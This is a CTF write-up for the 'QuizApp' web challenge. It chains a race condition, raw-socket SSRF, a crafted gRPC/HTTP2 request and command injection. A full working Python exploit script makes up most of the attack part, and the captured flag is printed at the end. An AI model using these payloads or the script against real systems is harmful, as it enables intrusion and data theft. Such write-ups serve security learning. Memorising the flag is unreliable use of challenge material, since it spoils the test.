# QuizApp Write-up

## Challenge Info

- **Name:** QuizApp  
- **Category:** Web  
- **Difficulty:** Hard  
- **Points:** 150  
- **Flag format:** VBD{...}  
- **Instance:** http://ctf.vulnbydefault.com:5484  

---

Exploit chain:

- Race condition → increase score  
- SSRF (raw socket) → reach internal service  
- gRPC + HTTP/2 → send crafted request  
- Command injection → read flag  
- Exfiltration → via uploaded avatar  

---

## Root Cause Analysis

### 1. Race Condition

```sql
SELECT COUNT(*) FROM solved_questions WHERE user_id = ? AND question_id = ?
```

```php
usleep(200000)
```

No locking → multiple requests pass → multiple score increments.

---

### 2. SSRF (Raw Socket)

```php
$data = urldecode(substr($path, 2));
fwrite($fp, $data);
```

Allows sending raw TCP data internally.

---

### 3. Command Injection

```go
cmdStr := fmt.Sprintf("ping -c 1 %s", ip)
exec.Command("sh", "-c", cmdStr)
```

Injection:

```text
127.0.0.1;cat /flag.txt
```

---

### 4. Full Chain

```text
Race → Score 100 → SSRF → gRPC → Command Injection → Flag
```

---

## Exploitation Steps

1. Register + login  
2. Spam `/submit.php` requests  
3. Reach score ≥ 100  
4. Send SSRF via `/profile.php`  
5. Trigger internal service  
6. Open uploaded image  
7. Extract flag  

---

## Exploit Script

```python
#!/usr/bin/env python3
import argparse
import concurrent.futures
import random
import re
import secrets
import string
import sys
import time

import requests

try:
    import h2.connection
except Exception:
    print("[!] Missing dependency: h2 (pip install h2)")
    sys.exit(1)


def rand_user(prefix="u"):
    return f"{prefix}_{''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(8))}"


def must(cond, msg):
    if not cond:
        raise RuntimeError(msg)


def parse_score(html):
    m = re.search(r'id="user-score">\s*(\d+)\s*<', html)
    return int(m.group(1)) if m else 0


def parse_question_and_options(html):
    q = re.search(r"submitAnswer\((\d+), '((?:\\'|[^'])*)'\)", html)
    if not q:
        return None, []
    qid = int(q.group(1))
    opts = re.findall(r"submitAnswer\(%d, '((?:\\'|[^'])*)'\)" % qid, html)
    opts = [o.replace("\\'", "'") for o in opts]
    opts = list(dict.fromkeys(opts))
    return qid, opts


def encode_varint(n):
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def build_grpc_h2_payload(command_str):
    conn = h2.connection.H2Connection()
    conn.initiate_connection()
    raw = bytearray(conn.data_to_send())

    headers = [
        (":method", "POST"),
        (":scheme", "http"),
        (":path", "/health.HealthCheck/CheckHealth"),
        (":authority", "127.0.0.1:50051"),
        ("content-type", "application/grpc"),
        ("te", "trailers"),
    ]
    conn.send_headers(1, headers)

    msg = command_str.encode()
    proto = b"\x0a" + encode_varint(len(msg)) + msg
    grpc_body = b"\x00" + len(proto).to_bytes(4, "big") + proto

    conn.send_data(1, grpc_body, end_stream=True)
    raw.extend(conn.data_to_send())
    return bytes(raw)


def percent_encode_bytes(b):
    return "".join(f"%{x:02X}" for x in b)


def run(base):
    s = requests.Session()

    username = rand_user("quiz")
    password = "P@ssw0rd!" + ''.join(random.choice(string.digits) for _ in range(3))

    print(f"[*] Target: {base}")
    print(f"[*] User: {username}")

    s.post(f"{base}/auth.php", data={"action": "register", "username": username, "password": password})
    s.post(f"{base}/auth.php", data={"action": "login", "username": username, "password": password})

    for _ in range(5):
        page = s.get(f"{base}/index.php")
        qid, opts = parse_question_and_options(page.text)

        def hit(ans):
            return s.post(f"{base}/submit.php", data={"question_id": qid, "answer": ans}).text

        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
            list(ex.map(hit, opts * 30))

    injected_ip = "127.0.0.1;cat /flag.txt"
    payload = build_grpc_h2_payload(injected_ip)
    url = f"http://127.0.0.1:50051/x{percent_encode_bytes(payload)}"

    s.post(f"{base}/profile.php", data={"avatar_url": url})

    prof = s.get(f"{base}/profile.php").text
    file = re.search(r"uploads/(.*?\.jpg)", prof).group(1)

    data = s.get(f"{base}/uploads/{file}").text
    flag = re.search(r"VBD\{.*?\}", data).group(0)

    print("[FLAG]", flag)


if __name__ == "__main__":
    run("http://ctf.vulnbydefault.com:5484")
```

---

## Flag

```text
VBD{grpc_with_g0ph3r_1s_b3st_8ce34e4dfe3390c372e49dbb61ad3242}
```

Thanks for reading and happy hacking!
